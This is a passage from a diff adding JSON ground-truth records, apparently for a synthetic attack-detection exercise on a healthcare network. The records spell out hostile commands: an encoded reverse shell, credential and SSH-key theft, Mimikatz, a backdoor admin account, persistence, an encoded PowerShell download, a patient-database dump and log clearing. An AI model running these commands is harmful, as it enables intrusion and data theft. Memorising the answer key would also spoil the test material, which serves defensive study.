+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "command_line": "bash -c 'echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC80NS4zMy4zMi4zMC84NDQzIDA+JjEi | base64 -d | bash'",
+        "pid": 778445,
+        "process_name": "/bin/bash"
+      }
+    },
+    {
+      "record_id": "evt-005#2",
+      "kind": "connection",
+      "storyline_id": "evt-005",
+      "time": "2024-03-18T13:20:12Z",
+      "actor": "apache",
+      "system": "WEB-EXT-01",
+      "activity": "Web shell upload and reverse shell callback to direct-IP C2",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "dst_ip": "45.33.32.30",
+        "dst_port": 8443,
+        "uid": "C1QRVxaYNAh53OOfPQ"
+      }
+    },
+    {
+      "record_id": "evt-005#3",
+      "kind": "raw",
+      "storyline_id": "evt-005",
+      "time": "2024-03-18T13:20:13Z",
+      "actor": "apache",
+      "system": "WEB-EXT-01",
+      "activity": "Web shell upload and reverse shell callback to direct-IP C2",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "target_format": "syslog"
+      }
+    },
+    {
+      "record_id": "evt-006#0",
+      "kind": "process",
+      "storyline_id": "evt-006",
+      "time": "2024-03-18T13:39:55Z",
+      "actor": "root",
+      "system": "WEB-EXT-01",
+      "activity": "Network and host discovery from the compromised web server",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "command_line": "ip addr show",
+        "pid": 778556,
+        "process_name": "/usr/sbin/ip"
+      }
+    },
+    {
+      "record_id": "evt-006#1",
+      "kind": "process",
+      "storyline_id": "evt-006",
+      "time": "2024-03-18T13:39:58Z",
+      "actor": "root",
+      "system": "WEB-EXT-01",
+      "activity": "Network and host discovery from the compromised web server",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "command_line": "cat /etc/hosts",
+        "pid": 778625,
+        "process_name": "/usr/bin/cat"
+      }
+    },
+    {
+      "record_id": "evt-006#2",
+      "kind": "process",
+      "storyline_id": "evt-006",
+      "time": "2024-03-18T13:40:09Z",
+      "actor": "root",
+      "system": "WEB-EXT-01",
+      "activity": "Network and host discovery from the compromised web server",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "command_line": "cat /etc/resolv.conf",
+        "pid": 778638,
+        "process_name": "/usr/bin/cat"
+      }
+    },
+    {
+      "record_id": "evt-006#3",
+      "kind": "process",
+      "storyline_id": "evt-006",
+      "time": "2024-03-18T13:41:11Z",
+      "actor": "root",
+      "system": "WEB-EXT-01",
+      "activity": "Network and host discovery from the compromised web server",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "command_line": "find /opt/ehr -name '*credential*' -maxdepth 3",
+        "pid": 778660,
+        "process_name": "/usr/bin/find"
+      }
+    },
+    {
+      "record_id": "evt-006#4",
+      "kind": "process",
+      "storyline_id": "evt-006",
+      "time": "2024-03-18T13:44:43Z",
+      "actor": "root",
+      "system": "WEB-EXT-01",
+      "activity": "Network and host discovery from the compromised web server",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "command_line": "nmap -sn 10.10.2.0/24",
+        "pid": 778663,
+        "process_name": "/usr/bin/nmap"
+      }
+    },
+    {
+      "record_id": "evt-006#5",
+      "kind": "process",
+      "storyline_id": "evt-006",
+      "time": "2024-03-18T13:44:57Z",
+      "actor": "root",
+      "system": "WEB-EXT-01",
+      "activity": "Network and host discovery from the compromised web server",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "command_line": "nmap -sT -p 22,80,443,445,3306 10.10.2.0/24",
+        "pid": 778727,
+        "process_name": "/usr/bin/nmap"
+      }
+    },
+    {
+      "record_id": "evt-007#0",
+      "kind": "process",
+      "storyline_id": "evt-007",
+      "time": "2024-03-18T13:59:48Z",
+      "actor": "root",
+      "system": "WEB-EXT-01",
+      "activity": "Harvest database credentials and SSH key material from the web server",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "command_line": "cat /var/www/html/config.php",
+        "pid": 778811,
+        "process_name": "/usr/bin/cat"
+      }
+    },
+    {
+      "record_id": "evt-007#1",
+      "kind": "process",
+      "storyline_id": "evt-007",
+      "time": "2024-03-18T13:59:54Z",
+      "actor": "root",
+      "system": "WEB-EXT-01",
+      "activity": "Harvest database credentials and SSH key material from the web server",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "command_line": "ls -la /root/.ssh",
+        "pid": 778877,
+        "process_name": "/usr/bin/ls"
+      }
+    },
+    {
+      "record_id": "evt-007#2",
+      "kind": "process",
+      "storyline_id": "evt-007",
+      "time": "2024-03-18T14:06:43Z",
+      "actor": "root",
+      "system": "WEB-EXT-01",
+      "activity": "Harvest database credentials and SSH key material from the web server",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "command_line": "cat /root/.ssh/id_rsa",
+        "pid": 778986,
+        "process_name": "/usr/bin/cat"
+      }
+    },
+    {
+      "record_id": "evt-008#0",
+      "kind": "connection",
+      "storyline_id": "evt-008",
+      "time": "2024-03-18T14:14:52Z",
+      "actor": "root",
+      "system": "APP-INT-01",
+      "activity": "Failed SSH attempt to PROXY-01 followed by successful SSH lateral movement to APP-INT-01",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "dst_ip": "10.10.3.20",
+        "dst_port": 22,
+        "uid": "CjJlHqKot8UnudGqWA0"
+      }
+    },
+    {
+      "record_id": "evt-008#1",
+      "kind": "ssh_session",
+      "storyline_id": "evt-008",
+      "time": "2024-03-18T14:15:03Z",
+      "actor": "root",
+      "system": "APP-INT-01",
+      "activity": "Failed SSH attempt to PROXY-01 followed by successful SSH lateral movement to APP-INT-01",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "dst_ip": "10.10.2.30",
+        "dst_port": 22,
+        "uid": "CS8VXBQDJYLEglZOBc"
+      }
+    },
+    {
+      "record_id": "evt-009#0",
+      "kind": "process",
+      "storyline_id": "evt-009",
+      "time": "2024-03-18T14:34:44Z",
+      "actor": "root",
+      "system": "APP-INT-01",
+      "activity": "Dump Linux password databases from APP-INT-01",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "command_line": "cat /etc/passwd",
+        "pid": 840761,
+        "process_name": "/usr/bin/cat"
+      }
+    },
+    {
+      "record_id": "evt-009#1",
+      "kind": "process",
+      "storyline_id": "evt-009",
+      "time": "2024-03-18T14:34:51Z",
+      "actor": "root",
+      "system": "APP-INT-01",
+      "activity": "Dump Linux password databases from APP-INT-01",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "command_line": "cat /etc/shadow",
+        "pid": 840763,
+        "process_name": "/usr/bin/cat"
+      }
+    },
+    {
+      "record_id": "evt-010#0",
+      "kind": "explicit_credentials",
+      "storyline_id": "evt-010",
+      "time": "2024-03-18T14:49:50Z",
+      "actor": "marcus.chen",
+      "system": "WS-MCHEN-01",
+      "activity": "Attacker uses explicit sysadmin credentials through RunAs",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "target_server": "DC-01",
+        "target_username": "marcus.chen"
+      }
+    },
+    {
+      "record_id": "evt-011#0",
+      "kind": "failed_logon",
+      "storyline_id": "evt-011",
+      "time": "2024-03-18T14:58:33Z",
+      "actor": "root",
+      "system": "LT-MRIVERA-02",
+      "activity": "Wrong-password fumble before broader credential spray",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "source_ip": "10.10.1.99"
+      }
+    },
+    {
+      "record_id": "evt-012#0",
+      "kind": "credential_spray",
+      "storyline_id": "evt-012",
+      "time": "2024-03-18T15:00:09Z",
+      "actor": "root",
+      "system": "WS-AJOHNSON-01",
+      "activity": "Credential spray succeeds against help desk user followed by RDP session",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "attempt_count": 4,
+        "pattern": "spray",
+        "success_account": "aisha.johnson",
+        "success_at_attempt": 4,
+        "target_accounts": [
+          "aisha.johnson",
+          "diego.ramirez",
+          "sophia.martinez"
+        ]
+      }
+    },
+    {
+      "record_id": "evt-012#1",
+      "kind": "rdp_session",
+      "storyline_id": "evt-012",
+      "time": "2024-03-18T15:00:10Z",
+      "actor": "aisha.johnson",
+      "system": "WS-AJOHNSON-01",
+      "activity": "Credential spray succeeds against help desk user followed by RDP session",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "dst_ip": "10.10.1.35",
+        "dst_port": 3389,
+        "uid": "C8gep6poaPfAZ9bb39i"
+      }
+    },
+    {
+      "record_id": "evt-013#0",
+      "kind": "logon",
+      "storyline_id": "evt-013",
+      "time": "2024-03-18T15:19:46Z",
+      "actor": "aisha.johnson",
+      "system": "WS-AJOHNSON-01",
+      "activity": "Active Directory enumeration from compromised workstation",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "logon_id": "0x26fffd0",
+        "source_ip": "10.10.1.99"
+      }
+    },
+    {
+      "record_id": "evt-013#1",
+      "kind": "process",
+      "storyline_id": "evt-013",
+      "time": "2024-03-18T15:19:46Z",
+      "actor": "aisha.johnson",
+      "system": "WS-AJOHNSON-01",
+      "activity": "Active Directory enumeration from compromised workstation",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "command_line": "whoami /all",
+        "pid": 6212,
+        "process_name": "C:\\Windows\\System32\\whoami.exe"
+      }
+    },
+    {
+      "record_id": "evt-013#2",
+      "kind": "process",
+      "storyline_id": "evt-013",
+      "time": "2024-03-18T15:19:49Z",
+      "actor": "aisha.johnson",
+      "system": "WS-AJOHNSON-01",
+      "activity": "Active Directory enumeration from compromised workstation",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "command_line": "net user /domain",
+        "pid": 6216,
+        "process_name": "C:\\Windows\\System32\\net.exe"
+      }
+    },
+    {
+      "record_id": "evt-013#3",
+      "kind": "process",
+      "storyline_id": "evt-013",
+      "time": "2024-03-18T15:19:49Z",
+      "actor": "aisha.johnson",
+      "system": "WS-AJOHNSON-01",
+      "activity": "Active Directory enumeration from compromised workstation",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "command_line": "net group \"Domain Admins\" /domain",
+        "pid": 6220,
+        "process_name": "C:\\Windows\\System32\\net.exe"
+      }
+    },
+    {
+      "record_id": "evt-013#4",
+      "kind": "process",
+      "storyline_id": "evt-013",
+      "time": "2024-03-18T15:19:59Z",
+      "actor": "aisha.johnson",
+      "system": "WS-AJOHNSON-01",
+      "activity": "Active Directory enumeration from compromised workstation",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "command_line": "net view /domain",
+        "pid": 6224,
+        "process_name": "C:\\Windows\\System32\\net.exe"
+      }
+    },
+    {
+      "record_id": "evt-013#5",
+      "kind": "dns_query",
+      "storyline_id": "evt-013",
+      "time": "2024-03-18T15:20:01Z",
+      "actor": "aisha.johnson",
+      "system": "WS-AJOHNSON-01",
+      "activity": "Active Directory enumeration from compromised workstation",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "qtype": "A",
+        "query": "DC-01.meridianhcs.local",
+        "rcode": "NOERROR"
+      }
+    },
+    {
+      "record_id": "evt-013#6",
+      "kind": "connection",
+      "storyline_id": "evt-013",
+      "time": "2024-03-18T15:20:02Z",
+      "actor": "aisha.johnson",
+      "system": "WS-AJOHNSON-01",
+      "activity": "Active Directory enumeration from compromised workstation",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "dst_ip": "10.10.2.10",
+        "dst_port": 389,
+        "uid": "COF9xnE9QC6CAAvq0"
+      }
+    },
+    {
+      "record_id": "evt-014#0",
+      "kind": "process",
+      "storyline_id": "evt-014",
+      "time": "2024-03-18T15:45:26Z",
+      "actor": "aisha.johnson",
+      "system": "WS-AJOHNSON-01",
+      "activity": "Credential dumping with Mimikatz disguised as a Windows indexing service",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "command_line": "ms-index-service.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit",
+        "pid": 6288,
+        "process_name": "C:\\Windows\\System32\\ms-index-service.exe"
+      }
+    },
+    {
+      "record_id": "evt-014#1",
+      "kind": "process_access",
+      "storyline_id": "evt-014",
+      "time": "2024-03-18T15:45:27Z",
+      "actor": "aisha.johnson",
+      "system": "WS-AJOHNSON-01",
+      "activity": "Credential dumping with Mimikatz disguised as a Windows indexing service",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "target_process": "C:\\Windows\\System32\\winlogon.exe"
+      }
+    },
+    {
+      "record_id": "evt-014#2",
+      "kind": "create_remote_thread",
+      "storyline_id": "evt-014",
+      "time": "2024-03-18T15:45:36Z",
+      "actor": "aisha.johnson",
+      "system": "WS-AJOHNSON-01",
+      "activity": "Credential dumping with Mimikatz disguised as a Windows indexing service",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "target_process": "C:\\Windows\\System32\\lsass.exe"
+      }
+    },
+    {
+      "record_id": "evt-015#0",
+      "kind": "logon",
+      "storyline_id": "evt-015",
+      "time": "2024-03-18T16:00:09Z",
+      "actor": "aisha.johnson",
+      "system": "DC-01",
+      "activity": "PsExec-style lateral movement to DC-01 through SMB service creation",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "logon_id": "0x55548c2",
+        "source_ip": "10.10.1.35"
+      }
+    },
+    {
+      "record_id": "evt-015#1",
+      "kind": "service_installed",
+      "storyline_id": "evt-015",
+      "time": "2024-03-18T16:00:11Z",
+      "actor": "aisha.johnson",
+      "system": "DC-01",
+      "activity": "PsExec-style lateral movement to DC-01 through SMB service creation",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "service_file_name": "%SystemRoot%\\PSEXESVC.exe",
+        "service_name": "PSEXESVC"
+      }
+    },
+    {
+      "record_id": "evt-015#2",
+      "kind": "process",
+      "storyline_id": "evt-015",
+      "time": "2024-03-18T16:00:12Z",
+      "actor": "aisha.johnson",
+      "system": "DC-01",
+      "activity": "PsExec-style lateral movement to DC-01 through SMB service creation",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "command_line": "PSEXESVC.exe -accepteula",
+        "pid": 6064,
+        "process_name": "C:\\Windows\\System32\\PSEXESVC.exe"
+      }
+    },
+    {
+      "record_id": "evt-015#3",
+      "kind": "process",
+      "storyline_id": "evt-015",
+      "time": "2024-03-18T16:00:14Z",
+      "actor": "aisha.johnson",
+      "system": "DC-01",
+      "activity": "PsExec-style lateral movement to DC-01 through SMB service creation",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "command_line": "cmd.exe /c whoami && hostname",
+        "pid": 6068,
+        "process_name": "C:\\Windows\\System32\\cmd.exe"
+      }
+    },
+    {
+      "record_id": "evt-016#0",
+      "kind": "process",
+      "storyline_id": "evt-016",
+      "time": "2024-03-18T16:15:26Z",
+      "actor": "SYSTEM",
+      "system": "DC-01",
+      "activity": "Create backdoor account and add it to Domain Admins",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "command_line": "net user svc_mhsync MhsSvc!2024 /add /domain",
+        "pid": 6092,
+        "process_name": "C:\\Windows\\System32\\net.exe"
+      }
+    },
+    {
+      "record_id": "evt-016#1",
+      "kind": "account_created",
+      "storyline_id": "evt-016",
+      "time": "2024-03-18T16:15:29Z",
+      "actor": "SYSTEM",
+      "system": "DC-01",
+      "activity": "Create backdoor account and add it to Domain Admins",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "target_username": "svc_mhsync"
+      }
+    },
+    {
+      "record_id": "evt-016#2",
+      "kind": "process",
+      "storyline_id": "evt-016",
+      "time": "2024-03-18T16:15:30Z",
+      "actor": "SYSTEM",
+      "system": "DC-01",
+      "activity": "Create backdoor account and add it to Domain Admins",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "command_line": "net group \"Domain Admins\" svc_mhsync /add /domain",
+        "pid": 6116,
+        "process_name": "C:\\Windows\\System32\\net.exe"
+      }
+    },
+    {
+      "record_id": "evt-016#3",
+      "kind": "group_member_added",
+      "storyline_id": "evt-016",
+      "time": "2024-03-18T16:15:32Z",
+      "actor": "SYSTEM",
+      "system": "DC-01",
+      "activity": "Create backdoor account and add it to Domain Admins",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "group_name": "Domain Admins",
+        "member_name": "svc_mhsync"
+      }
+    },
+    {
+      "record_id": "evt-017#0",
+      "kind": "process",
+      "storyline_id": "evt-017",
+      "time": "2024-03-18T16:20:11Z",
+      "actor": "SYSTEM",
+      "system": "DC-01",
+      "activity": "Install service and scheduled task persistence on DC-01",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "command_line": "sc.exe create DeviceSyncSvc binPath= C:\\Windows\\System32\\DeviceSyncSvc.exe obj= LocalSystem start= auto",
+        "pid": 6140,
+        "process_name": "C:\\Windows\\System32\\sc.exe"
+      }
+    },
+    {
+      "record_id": "evt-017#1",
+      "kind": "service_installed",
+      "storyline_id": "evt-017",
+      "time": "2024-03-18T16:20:13Z",
+      "actor": "SYSTEM",
+      "system": "DC-01",
+      "activity": "Install service and scheduled task persistence on DC-01",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "service_file_name": "C:\\Windows\\System32\\DeviceSyncSvc.exe",
+        "service_name": "DeviceSyncSvc"
+      }
+    },
+    {
+      "record_id": "evt-017#2",
+      "kind": "process",
+      "storyline_id": "evt-017",
+      "time": "2024-03-18T16:20:15Z",
+      "actor": "SYSTEM",
+      "system": "DC-01",
+      "activity": "Install service and scheduled task persistence on DC-01",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "command_line": "schtasks.exe /Create /TN \"\\Microsoft\\Windows\\Maintenance\\DeviceSync\" /SC HOURLY /TR \"C:\\Windows\\System32\\DeviceSyncSvc.exe\" /RU SYSTEM",
+        "pid": 6156,
+        "process_name": "C:\\Windows\\System32\\schtasks.exe"
+      }
+    },
+    {
+      "record_id": "evt-017#3",
+      "kind": "scheduled_task_created",
+      "storyline_id": "evt-017",
+      "time": "2024-03-18T16:20:22Z",
+      "actor": "SYSTEM",
+      "system": "DC-01",
+      "activity": "Install service and scheduled task persistence on DC-01",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "task_content": "<Task><Actions><Exec><Command>C:\\Windows\\System32\\DeviceSyncSvc.exe</Command></Exec></Actions></Task>",
+        "task_name": "\\Microsoft\\Windows\\Maintenance\\DeviceSync"
+      }
+    },
+    {
+      "record_id": "evt-018#0",
+      "kind": "beacon",
+      "storyline_id": "evt-018",
+      "time": "2024-03-18T16:30:23Z",
+      "actor": "SYSTEM",
+      "system": "DC-01",
+      "activity": "Allowed HTTPS beacon from DC-01 to attacker infrastructure",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "action": "allow",
+        "attempt_count": 10,
+        "dst_ip": "45.33.32.30",
+        "dst_port": 443,
+        "interval": "10m",
+        "termination": "1h30m"
+      }
+    },
+    {
+      "record_id": "evt-019#0",
+      "kind": "beacon",
+      "storyline_id": "evt-019",
+      "time": "2024-03-18T16:30:51Z",
+      "actor": "SYSTEM",
+      "system": "DC-01",
+      "activity": "Direct C2 beacon attempts from DC-01 are blocked by firewall",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "action": "deny",
+        "attempt_count": 4,
+        "dst_ip": "45.33.32.30",
+        "dst_port": 443,
+        "interval": "30m",
+        "termination": "1h30m"
+      }
+    },
+    {
+      "record_id": "evt-020#0",
+      "kind": "dns_tunnel",
+      "storyline_id": "evt-020",
+      "time": "2024-03-18T16:44:55Z",
+      "actor": "root",
+      "system": "APP-INT-01",
+      "activity": "DNS tunneling exfiltration from APP-INT-01",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "base_domain": "ns1.westbridge-services.net",
+        "bytes_exfiltrated": 1145,
+        "encoding": "hex",
+        "qtype": "TXT",
+        "total_queries": 225
+      }
+    },
+    {
+      "record_id": "evt-021#0",
+      "kind": "dga_queries",
+      "storyline_id": "evt-021",
+      "time": "2024-03-18T16:59:43Z",
+      "actor": "root",
+      "system": "WEB-EXT-01",
+      "activity": "DGA queries from compromised web server",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "domain_sample": [
+          "ewnjsaqf1rasgez5.net",
+          "6cja6syvo02mu.net",
+          "30rgw6r7503.net",
+          "qrdqtp5nhn66chp00.net",
+          "2j3rhpi2329sn.net"
+        ],
+        "nxdomain_count": 80,
+        "tld": ".net",
+        "total_queries": 91
+      }
+    },
+    {
+      "record_id": "evt-022#0",
+      "kind": "logon",
+      "storyline_id": "evt-022",
+      "time": "2024-03-18T17:01:27Z",
+      "actor": "svc_mhsync",
+      "system": "FILE-SRV-01",
+      "activity": "Backdoor account authenticates to FILE-SRV-01 and stages sensitive data",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "logon_id": "0xf885de6",
+        "source_ip": "10.10.1.35"
+      }
+    },
+    {
+      "record_id": "evt-022#1",
+      "kind": "process",
+      "storyline_id": "evt-022",
+      "time": "2024-03-18T17:01:29Z",
+      "actor": "svc_mhsync",
+      "system": "FILE-SRV-01",
+      "activity": "Backdoor account authenticates to FILE-SRV-01 and stages sensitive data",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "command_line": "net view \\\\FILE-SRV-01",
+        "pid": 6812,
+        "process_name": "C:\\Windows\\System32\\net.exe"
+      }
+    },
+    {
+      "record_id": "evt-022#2",
+      "kind": "process",
+      "storyline_id": "evt-022",
+      "time": "2024-03-18T17:01:31Z",
+      "actor": "svc_mhsync",
+      "system": "FILE-SRV-01",
+      "activity": "Backdoor account authenticates to FILE-SRV-01 and stages sensitive data",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "command_line": "powershell.exe -NoProfile -Command \"Compress-Archive -Path \\\\FILE-SRV-01\\Finance\\Q1\\*,\\\\FILE-SRV-01\\Patients\\Exports\\* -DestinationPath C:\\ProgramData\\Microsoft\\cache_7f3a.zip\"",
+        "pid": 6816,
+        "process_name": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "staged_archive": "C:\\ProgramData\\Microsoft\\cache_7f3a.zip"
+      }
+    },
+    {
+      "record_id": "evt-023#0",
+      "kind": "process",
+      "storyline_id": "evt-023",
+      "time": "2024-03-18T17:14:44Z",
+      "actor": "root",
+      "system": "DB-PROD-01",
+      "activity": "SSH to DB-PROD-01, dump patient database, gzip, and SCP archive back to APP-INT-01",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "command_line": "mysqldump --single-transaction ehr patients insurance_claims > /tmp/rpt_0318.sql",
+        "output_file": "/tmp/rpt_0318.sql",
+        "pid": 699190,
+        "process_name": "/usr/bin/mysqldump"
+      }
+    },
+    {
+      "record_id": "evt-023#1",
+      "kind": "ssh_session",
+      "storyline_id": "evt-023",
+      "time": "2024-03-18T17:14:44Z",
+      "actor": "root",
+      "system": "DB-PROD-01",
+      "activity": "SSH to DB-PROD-01, dump patient database, gzip, and SCP archive back to APP-INT-01",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "dst_ip": "10.10.4.10",
+        "dst_port": 22,
+        "uid": "CzouobWAdZeFURjBK"
+      }
+    },
+    {
+      "record_id": "evt-023#2",
+      "kind": "process",
+      "storyline_id": "evt-023",
+      "time": "2024-03-18T17:22:00Z",
+      "actor": "root",
+      "system": "DB-PROD-01",
+      "activity": "SSH to DB-PROD-01, dump patient database, gzip, and SCP archive back to APP-INT-01",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "command_line": "gzip -9 /tmp/rpt_0318.sql",
+        "pid": 699311,
+        "process_name": "/usr/bin/gzip"
+      }
+    },
+    {
+      "record_id": "evt-023#3",
+      "kind": "process",
+      "storyline_id": "evt-023",
+      "time": "2024-03-18T17:29:21Z",
+      "actor": "root",
+      "system": "DB-PROD-01",
+      "activity": "SSH to DB-PROD-01, dump patient database, gzip, and SCP archive back to APP-INT-01",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "command_line": "scp /tmp/rpt_0318.sql.gz root@10.10.2.30:/tmp/.cache/rpt_0318.sql.gz",
+        "pid": 699428,
+        "process_name": "/usr/bin/scp"
+      }
+    },
+    {
+      "record_id": "evt-024#0",
+      "kind": "workstation_lock",
+      "storyline_id": "evt-024",
+      "time": "2024-03-18T17:20:19Z",
+      "actor": "aisha.johnson",
+      "system": "WS-AJOHNSON-01",
+      "activity": "Attacker locks compromised workstation before stepping away",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {}
+    },
+    {
+      "record_id": "evt-025#0",
+      "kind": "connection",
+      "storyline_id": "evt-025",
+      "time": "2024-03-18T17:25:08Z",
+      "actor": "aisha.johnson",
+      "system": "WS-AJOHNSON-01",
+      "activity": "Upload compressed archive to external staging domain over HTTPS",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "dst_ip": "10.10.2.10",
+        "dst_port": 443,
+        "uid": "CyPRzHadidiHbTWA3"
+      }
+    },
+    {
+      "record_id": "evt-026#0",
+      "kind": "beacon",
+      "storyline_id": "evt-026",
+      "time": "2024-03-18T17:30:16Z",
+      "actor": "root",
+      "system": "WEB-EXT-01",
+      "activity": "Ongoing periodic beacon from WEB-EXT-01",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "action": "allow",
+        "attempt_count": 3,
+        "dst_ip": "45.33.32.30",
+        "dst_port": 443,
+        "interval": "10m",
+        "termination": "count=3"
+      }
+    },
+    {
+      "record_id": "evt-027#0",
+      "kind": "workstation_unlock",
+      "storyline_id": "evt-027",
+      "time": "2024-03-18T17:35:07Z",
+      "actor": "aisha.johnson",
+      "system": "WS-AJOHNSON-01",
+      "activity": "Attacker returns and unlocks compromised workstation",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {}
+    },
+    {
+      "record_id": "evt-028#0",
+      "kind": "process",
+      "storyline_id": "evt-028",
+      "time": "2024-03-18T17:40:07Z",
+      "actor": "root",
+      "system": "WEB-EXT-01",
+      "activity": "Clear Linux shell history on WEB-EXT-01",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "command_line": "shred -u /root/.bash_history",
+        "pid": 780666,
+        "process_name": "/usr/bin/shred"
+      }
+    },
+    {
+      "record_id": "evt-029#0",
+      "kind": "process",
+      "storyline_id": "evt-029",
+      "time": "2024-03-18T17:40:47Z",
+      "actor": "root",
+      "system": "APP-INT-01",
+      "activity": "Clear Linux shell history on APP-INT-01",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "command_line": "history -c && cat /dev/null > ~/.bash_history",
+        "output_file": "/root/.bash_history",
+        "pid": 844491,
+        "process_name": "/bin/bash"
+      }
+    },
+    {
+      "record_id": "evt-030#0",
+      "kind": "process",
+      "storyline_id": "evt-030",
+      "time": "2024-03-18T17:41:49Z",
+      "actor": "SYSTEM",
+      "system": "DC-01",
+      "activity": "Encoded PowerShell download and Security log clearing on DC-01",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "command_line": "powershell.exe -NoProfile -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAcwA6AC8ALwBhAHAAaQAuAHcAZQBzAHQAYgByAGkAZABnAGUALQBzAGUAcgB2AGkAYwBlAHMALgBuAGUAdAAvAHYAMgAvAG0AYQBuAGkAZgBlAHMAdAAiACkA",
+        "network_url": "https://api.westbridge-services.net/v2/manifest",
+        "pid": 6452,
+        "process_name": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+      }
+    },
+    {
+      "record_id": "evt-030#1",
+      "kind": "process",
+      "storyline_id": "evt-030",
+      "time": "2024-03-18T17:41:50Z",
+      "actor": "SYSTEM",
+      "system": "DC-01",
+      "activity": "Encoded PowerShell download and Security log clearing on DC-01",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "command_line": "wevtutil cl Security",
+        "pid": 6504,
+        "process_name": "C:\\Windows\\System32\\wevtutil.exe"
+      }
+    },
+    {
+      "record_id": "evt-030#2",
+      "kind": "log_cleared",
+      "storyline_id": "evt-030",
+      "time": "2024-03-18T17:41:51Z",
+      "actor": "SYSTEM",
+      "system": "DC-01",
+      "activity": "Encoded PowerShell download and Security log clearing on DC-01",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {}
+    },
+    {
+      "record_id": "evt-031#0",
+      "kind": "dns_query",
+      "storyline_id": "evt-031",
+      "time": "2024-03-18T17:45:04Z",
+      "actor": "root",
+      "system": "APP-INT-01",
+      "activity": "Standalone DNS queries for attacker infrastructure",
+      "ground_truth_section": "storyline",
+      "emitted": true,
+      "attributes": {
+        "qtype": "A",
+        "query": "edge.westbridge-services.net",
+        "rcode": "NOERROR"
+      }
+    },
+    {
+      "record_id": "evt-031#1",
+      "kind": "dns_query",
